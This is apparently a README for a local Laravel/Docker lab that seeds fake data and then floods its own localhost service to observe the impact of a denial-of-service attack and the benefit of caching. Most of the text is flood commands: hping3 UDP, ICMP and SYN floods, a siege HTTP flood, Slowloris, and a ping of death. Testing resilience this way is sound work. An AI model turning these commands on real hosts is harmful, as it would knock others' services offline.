#### Run service with 
```
./vendor/bin/sail up -d
```

#### Install dependencies
```
docker exec -i app bash -c "composer install"
```

#### Run migrations
```
docker exec -i app bash -c "php artisan migrate"
```

#### Create fake data, go to
```
http://localhost/api/make-fake-data
```

### Run DDOS:
UDP flood:
```
docker run --network=host --rm -it sflow/hping3 --flood --udp -s 53 --keep -p 68 127.0.0.1
```
ICMP flood:
```
docker run --network=host --rm -it sflow/hping3 --flood --icmp -d 1000 127.0.0.1
```
HTTP flood:
```
siege -b -c20 -v -t20s localhost
```
Slowloris:
```
docker run --network ddos_sail -it javabudd/slowloris:latest ddos_target_nginx/products 80 100 500 2
```
SYN flood:
```
docker run --network=host --rm -it sflow/hping3  --flood -S -p 80
```
Ping of Death:
```
ping -l 65510 localhost
```

### Run siege to watch ddos effect
with cache:
```
siege -b -c8 -v -t20s localhost
```